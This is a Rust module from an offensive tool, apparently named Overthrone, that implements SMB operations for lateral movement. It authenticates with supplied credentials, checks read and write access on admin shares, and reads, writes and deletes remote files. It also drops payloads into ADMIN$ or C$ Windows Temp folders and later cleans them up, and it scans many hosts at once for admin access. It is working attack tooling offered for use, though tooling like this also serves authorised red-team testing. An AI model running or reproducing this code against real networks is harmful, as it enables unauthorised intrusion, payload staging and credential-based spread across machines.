//! SMB2/3 client operations for share enumeration, file access, and lateral movement.
//!
//! On Windows: full implementation using the `smb` crate (NTLM via sspi).
//! On Linux/macOS: stub implementation -- types are available but all operations
//! return errors. This allows the rest of the codebase to compile cross-platform.

use crate::error::{OverthroneError, Result};
use tracing::{debug, info, warn};

// Windows-only imports

#[cfg(windows)]
use smb::{
    Client, ClientConfig, CreateOptions, FileAccessMask, FileAttributes, FileCreateArgs,
    ReadAt, Resource, UncPath, WriteAt,
};
#[cfg(windows)]
use std::str::FromStr;

// Constants

pub const SMB_PORT: u16 = 445;
pub const ADMIN_SHARES: &[&str] = &["C$", "ADMIN$", "IPC$"];
const READ_BUF_SIZE: usize = 65536;

// Public Types (available on all platforms)

pub struct SmbSession {
    #[cfg(windows)]
    client: Client,
    pub target: String,
    pub username: String,
    pub domain: String,
}

#[derive(Debug, Clone)]
pub struct RemoteFileInfo {
    pub name: String,
    pub path: String,
    pub is_directory: bool,
    pub size: u64,
}

#[derive(Debug, Clone)]
pub struct ShareAccessResult {
    pub share_name: String,
    pub readable: bool,
    pub writable: bool,
    pub is_admin_share: bool,
}

#[derive(Debug, Clone)]
pub struct AdminCheckResult {
    pub target: String,
    pub has_admin: bool,
    pub accessible_shares: Vec<String>,
}

// Windows: Full Implementation

#[cfg(windows)]
impl SmbSession {
    pub async fn connect(
        target: &str,
        domain: &str,
        username: &str,
        password: &str,
    ) -> Result<Self> {
        info!("SMB: Connecting to \\\\{target} as {domain}\\{username}");

        let client = Client::new(ClientConfig::default());
        let ipc_path = format!(r"\\{}\IPC$", target);
        let unc = UncPath::from_str(&ipc_path).map_err(|e| {
            OverthroneError::Smb(format!("Invalid UNC path '{ipc_path}': {e}"))
        })?;

        client
            .share_connect(&unc, username, password.to_string())
            .await
            .map_err(|e| {
                OverthroneError::Smb(format!(
                    "Auth failed to \\\\{target}\\IPC$ as {domain}\\{username}: {e}"
                ))
            })?;

        info!("SMB: Authenticated to \\\\{target}");

        Ok(SmbSession {
            client,
            target: target.to_string(),
            username: username.to_string(),
            domain: domain.to_string(),
        })
    }

    fn unc(&self, share: &str, path: Option<&str>) -> Result<UncPath> {
        let full = match path {
            Some(p) => format!(r"\\{}\{}\{}", self.target, share, p),
            None => format!(r"\\{}\{}", self.target, share),
        };
        UncPath::from_str(&full)
            .map_err(|e| OverthroneError::Smb(format!("Invalid UNC path '{full}': {e}")))
    }

    pub async fn connect_share(&self, share: &str) -> Result<()> {
        let unc = self.unc(share, None)?;
        self.client
            .share_connect(&unc, &self.username, String::new())
            .await
            .map_err(|e| {
                OverthroneError::Smb(format!(
                    "Cannot connect to \\\\{}\\{}: {e}",
                    self.target, share
                ))
            })?;
        debug!("SMB: Connected to \\\\{}\\{}", self.target, share);
        Ok(())
    }

    pub async fn check_share_read(&self, share: &str) -> bool {
        let unc = match self.unc(share, None) {
            Ok(u) => u,
            Err(_) => return false,
        };
        match self.client.share_connect(&unc, &self.username, String::new()).await {
            Ok(_) => {
                debug!("SMB: Read access on \\\\{}\\{}", self.target, share);
                true
            }
            Err(_) => false,
        }
    }

    pub async fn check_share_write(&self, share: &str) -> bool {
        let test_file = format!("__overthrone_test_{}.tmp", rand::random::<u32>());
        let unc = match self.unc(share, Some(&test_file)) {
            Ok(u) => u,
            Err(_) => return false,
        };
        let create_args = FileCreateArgs::make_create_new(
            FileAttributes::default(),
            CreateOptions::default(),
        );
        match self.client.create_file(&unc, &create_args).await {
            Ok(resource) => {
                if let Resource::File(file) = resource {
                    let _ = file.close().await;
                }
                let _ = self.delete_file(share, &test_file).await;
                debug!("SMB: Write access on \\\\{}\\{}", self.target, share);
                true
            }
            Err(_) => false,
        }
    }

    pub async fn check_share_access(&self, shares: &[&str]) -> Vec<ShareAccessResult> {
        let mut results = Vec::new();
        for &share in shares {
            let readable = self.check_share_read(share).await;
            let writable = if readable && share != "IPC$" {
                self.check_share_write(share).await
            } else {
                false
            };
            results.push(ShareAccessResult {
                share_name: share.to_string(),
                readable,
                writable,
                is_admin_share: ADMIN_SHARES.contains(&share),
            });
        }
        results
    }

    pub async fn check_admin_access(&self) -> AdminCheckResult {
        info!("SMB: Checking admin access on {}", self.target);
        let shares_to_check = ["C$", "ADMIN$", "IPC$"];
        let mut accessible = Vec::new();
        let mut has_admin = false;
        for share in &shares_to_check {
            if self.check_share_read(share).await {
                accessible.push(share.to_string());
                if *share == "C$" || *share == "ADMIN$" {
                    has_admin = true;
                }
            }
        }
        if has_admin {
            info!("SMB: ADMIN ACCESS on {} ({:?})", self.target, accessible);
        } else {
            info!("SMB: No admin on {} ({:?})", self.target, accessible);
        }
        AdminCheckResult {
            target: self.target.clone(),
            has_admin,
            accessible_shares: accessible,
        }
    }

    pub async fn list_directory(
        &self,
        share: &str,
        remote_path: &str,
    ) -> Result<Vec<RemoteFileInfo>> {
        info!("SMB: Listing \\\\{}\\{}\\{}", self.target, share, remote_path);
        let smb_path = remote_path
            .replace('/', "\\")
            .trim_start_matches('\\')
            .to_string();
        let ls_cmd = if smb_path.is_empty() {
            "ls".to_string()
        } else {
            format!("cd \"{}\"; ls", smb_path)
        };
        let output = tokio::process::Command::new("smbclient")
            .arg(format!("\\\\{}\\{}", self.target, share))
            .arg("-U")
            .arg(format!("{}\\{}%", self.domain, self.username))
            .arg("-c")
            .arg(&ls_cmd)
            .output()
            .await
            .map_err(|e| OverthroneError::Smb(format!("smbclient failed: {e}")))?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(OverthroneError::Smb(format!("smbclient listing failed: {}", stderr.trim())));
        }
        let stdout = String::from_utf8_lossy(&output.stdout);
        let mut entries = Vec::new();
        for line in stdout.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty()
                || trimmed.starts_with("Domain=")
                || trimmed.contains("blocks of size")
                || trimmed.contains("blocks available")
            {
                continue;
            }
            let parts: Vec<&str> = trimmed.splitn(2, char::is_whitespace).collect();
            if parts.len() < 2 { continue; }
            let name = parts[0].to_string();
            if name == "." || name == ".." { continue; }
            let rest = parts[1].trim();
            let is_directory = rest.contains('D');
            let size = rest.split_whitespace().find_map(|tok| tok.parse::<u64>().ok()).unwrap_or(0);
            entries.push(RemoteFileInfo {
                name: name.clone(),
                path: if smb_path.is_empty() { name } else { format!("{}\\{}", smb_path, name) },
                is_directory,
                size,
            });
        }
        info!("SMB: Listed {} entries", entries.len());
        Ok(entries)
    }

    pub async fn read_file(&self, share: &str, remote_path: &str) -> Result<Vec<u8>> {
        info!("SMB: Reading \\\\{}\\{}\\{}", self.target, share, remote_path);
        let unc = self.unc(share, Some(remote_path))?;
        let open_args = FileCreateArgs::make_open_existing(
            FileAccessMask::new().with_generic_read(true),
        );
        let resource = self.client.create_file(&unc, &open_args).await.map_err(|e| {
            OverthroneError::Smb(format!("Cannot open '{}': {e}", remote_path))
        })?;
        let file = match resource {
            Resource::File(f) => f,
            _ => return Err(OverthroneError::Smb(format!("'{remote_path}' is not a file"))),
        };
        let mut data = Vec::new();
        let mut offset: u64 = 0;
        loop {
            let mut buf = vec![0u8; READ_BUF_SIZE];
            let bytes_read = file.read_at(&mut buf, offset).await.map_err(|e| {
                OverthroneError::Smb(format!("Read error at offset {offset}: {e}"))
            })?;
            if bytes_read == 0 { break; }
            data.extend_from_slice(&buf[..bytes_read]);
            offset += bytes_read as u64;
        }
        file.close().await.map_err(|e| OverthroneError::Smb(format!("Close failed: {e}")))?;
        info!("SMB: Read {} bytes from {}", data.len(), remote_path);
        Ok(data)
    }

    pub async fn write_file(&self, share: &str, remote_path: &str, data: &[u8]) -> Result<()> {
        info!("SMB: Writing {} bytes to \\\\{}\\{}\\{}", data.len(), self.target, share, remote_path);
        let unc = self.unc(share, Some(remote_path))?;
        let create_args = FileCreateArgs::make_overwrite(
            FileAttributes::default(),
            CreateOptions::default(),
        );
        let resource = self.client.create_file(&unc, &create_args).await.map_err(|e| {
            OverthroneError::Smb(format!("Cannot create '{}': {e}", remote_path))
        })?;
        let file = match resource {
            Resource::File(f) => f,
            _ => return Err(OverthroneError::Smb(format!("'{remote_path}' is not a file"))),
        };
        let mut offset: u64 = 0;
        for chunk in data.chunks(READ_BUF_SIZE) {
            file.write_at(chunk, offset).await.map_err(|e| {
                OverthroneError::Smb(format!("Write error at offset {offset}: {e}"))
            })?;
            offset += chunk.len() as u64;
        }
        file.close().await.map_err(|e| OverthroneError::Smb(format!("Close failed: {e}")))?;
        info!("SMB: Write complete ({} bytes)", data.len());
        Ok(())
    }

    pub async fn delete_file(&self, share: &str, remote_path: &str) -> Result<()> {
        info!("SMB: Deleting \\\\{}\\{}\\{}", self.target, share, remote_path);
        let unc = self.unc(share, Some(remote_path))?;
        let open_args = FileCreateArgs::make_open_existing(
            FileAccessMask::new().with_delete(true),
        );
        let resource = self.client.create_file(&unc, &open_args).await.map_err(|e| {
            OverthroneError::Smb(format!("Cannot open for delete '{}': {e}", remote_path))
        })?;
        if let Resource::File(file) = resource {
            file.close().await.map_err(|e| {
                OverthroneError::Smb(format!("Delete failed '{}': {e}", remote_path))
            })?;
        }
        info!("SMB: Deleted {}", remote_path);
        Ok(())
    }

    pub async fn download_file(&self, share: &str, remote_path: &str, local_path: &str) -> Result<usize> {
        let data = self.read_file(share, remote_path).await?;
        let size = data.len();
        tokio::fs::write(local_path, &data).await.map_err(|e| {
            OverthroneError::Smb(format!("Cannot write local file '{}': {e}", local_path))
        })?;
        info!("SMB: Downloaded {} -> {} ({} bytes)", remote_path, local_path, size);
        Ok(size)
    }

    pub async fn upload_file(&self, local_path: &str, share: &str, remote_path: &str) -> Result<usize> {
        let data = tokio::fs::read(local_path).await.map_err(|e| {
            OverthroneError::Smb(format!("Cannot read '{}': {e}", local_path))
        })?;
        let size = data.len();
        self.write_file(share, remote_path, &data).await?;
        info!("SMB: Uploaded {} -> {} ({} bytes)", local_path, remote_path, size);
        Ok(size)
    }

    pub async fn pipe_transact(&self, pipe_name: &str, request: &[u8]) -> Result<Vec<u8>> {
        info!("SMB: Pipe transact '{}' ({} bytes)", pipe_name, request.len());
        let unc = self.unc("IPC$", Some(pipe_name))?;
        let open_args = FileCreateArgs::make_pipe();
        let resource = self.client.create_file(&unc, &open_args).await.map_err(|e| {
            OverthroneError::Smb(format!("Cannot open pipe '{}': {e}", pipe_name))
        })?;
        let pipe = match resource {
            Resource::Pipe(p) => p,
            _ => return Err(OverthroneError::Smb(format!("'{pipe_name}' is not a named pipe"))),
        };
        let response = pipe
            .ioctl(0x0011C017, request.to_vec(), READ_BUF_SIZE as u32)
            .await
            .map_err(|e| OverthroneError::Smb(format!("Pipe transact failed on '{}': {e}", pipe_name)))?;
        pipe.close().await.map_err(|e| OverthroneError::Smb(format!("Pipe close failed: {e}")))?;
        debug!("SMB: Pipe response: {} bytes", response.len());
        Ok(response)
    }

    pub async fn deploy_payload(&self, payload_bytes: &[u8], remote_filename: &str) -> Result<String> {
        info!("SMB: Deploying '{}' to {}", remote_filename, self.target);
        let (share, remote_path) = if self.check_share_read("ADMIN$").await {
            ("ADMIN$", format!("Temp\\{}", remote_filename))
        } else if self.check_share_read("C$").await {
            ("C$", format!("Windows\\Temp\\{}", remote_filename))
        } else {
            return Err(OverthroneError::Smb(format!("No admin share access on {}", self.target)));
        };
        self.write_file(share, &remote_path, payload_bytes).await?;
        let full_path = if share == "ADMIN$" {
            format!("C:\\Windows\\{}", remote_path)
        } else {
            format!("C:\\{}", remote_path)
        };
        info!("SMB: Payload at {}", full_path);
        Ok(full_path)
    }

    pub async fn cleanup_payload(&self, remote_filename: &str) -> Result<()> {
        let attempts = [
            ("ADMIN$", format!("Temp\\{}", remote_filename)),
            ("C$", format!("Windows\\Temp\\{}", remote_filename)),
        ];
        for (share, path) in &attempts {
            if self.delete_file(share, path).await.is_ok() {
                info!("SMB: Cleaned up {}\\{}", share, path);
                return Ok(());
            }
        }
        warn!("SMB: Payload not found for cleanup: {}", remote_filename);
        Ok(())
    }
}

// Non-Windows: Stub Implementation
// Types compile everywhere; operations return errors.

#[cfg(not(windows))]
impl SmbSession {
    pub async fn connect(
        target: &str,
        domain: &str,
        username: &str,
        _password: &str,
    ) -> Result<Self> {
        warn!("SMB: Native NTLM auth requires Windows (sspi). Connection to {} will be limited.", target);
        Ok(Self {
            target: target.to_string(),
            username: username.to_string(),
            domain: domain.to_string(),
        })
    }

    pub async fn connect_share(&self, share: &str) -> Result<()> {
        Err(OverthroneError::Smb(format!(
            "SMB share connect to \\\\{}\\{} requires Windows (sspi)", self.target, share
        )))
    }

    pub async fn check_share_read(&self, _share: &str) -> bool { false }
    pub async fn check_share_write(&self, _share: &str) -> bool { false }

    pub async fn check_share_access(&self, shares: &[&str]) -> Vec<ShareAccessResult> {
        shares.iter().map(|&s| ShareAccessResult {
            share_name: s.to_string(),
            readable: false,
            writable: false,
            is_admin_share: ADMIN_SHARES.contains(&s),
        }).collect()
    }

    pub async fn check_admin_access(&self) -> AdminCheckResult {
        AdminCheckResult {
            target: self.target.clone(),
            has_admin: false,
            accessible_shares: Vec::new(),
        }
    }

    pub async fn list_directory(&self, _share: &str, _path: &str) -> Result<Vec<RemoteFileInfo>> {
        Err(OverthroneError::Smb("SMB directory listing requires Windows (sspi)".into()))
    }

    pub async fn read_file(&self, _share: &str, path: &str) -> Result<Vec<u8>> {
        Err(OverthroneError::Smb(format!("SMB read '{}' requires Windows (sspi)", path)))
    }

    pub async fn write_file(&self, _share: &str, path: &str, _data: &[u8]) -> Result<()> {
        Err(OverthroneError::Smb(format!("SMB write '{}' requires Windows (sspi)", path)))
    }

    pub async fn delete_file(&self, _share: &str, path: &str) -> Result<()> {
        Err(OverthroneError::Smb(format!("SMB delete '{}' requires Windows (sspi)", path)))
    }

    pub async fn download_file(&self, _share: &str, path: &str, _local: &str) -> Result<usize> {
        Err(OverthroneError::Smb(format!("SMB download '{}' requires Windows (sspi)", path)))
    }

    pub async fn upload_file(&self, local: &str, _share: &str, _path: &str) -> Result<usize> {
        Err(OverthroneError::Smb(format!("SMB upload '{}' requires Windows (sspi)", local)))
    }

    pub async fn pipe_transact(&self, pipe_name: &str, _request: &[u8]) -> Result<Vec<u8>> {
        Err(OverthroneError::Smb(format!("SMB pipe '{}' requires Windows (sspi)", pipe_name)))
    }

    pub async fn deploy_payload(&self, _bytes: &[u8], _filename: &str) -> Result<String> {
        Err(OverthroneError::Smb("SMB payload deploy requires Windows (sspi)".into()))
    }

    pub async fn cleanup_payload(&self, _filename: &str) -> Result<()> {
        Ok(())
    }
}

// Bulk Operations (multi-target)

pub async fn check_admin_targets(
    targets: &[String],
    domain: &str,
    username: &str,
    password: &str,
    concurrency: usize,
) -> Vec<AdminCheckResult> {
    use std::sync::Arc;
    use tokio::sync::Semaphore;

    info!("SMB: Scanning {} targets for admin access", targets.len());

    let sem = Arc::new(Semaphore::new(concurrency));
    let mut handles = Vec::new();

    for target in targets {
        let target = target.clone();
        let domain = domain.to_string();
        let username = username.to_string();
        let password = password.to_string();
        let sem = Arc::clone(&sem);

        handles.push(tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            match SmbSession::connect(&target, &domain, &username, &password).await {
                Ok(session) => session.check_admin_access().await,
                Err(e) => {
                    debug!("SMB: Cannot connect to {target}: {e}");
                    AdminCheckResult {
                        target,
                        has_admin: false,
                        accessible_shares: Vec::new(),
                    }
                }
            }
        }));
    }

    let mut results = Vec::new();
    for h in handles {
        if let Ok(r) = h.await {
            results.push(r);
        }
    }

    let admin_count = results.iter().filter(|r| r.has_admin).count();
    info!("SMB: Admin on {admin_count}/{} targets", results.len());
    results
}
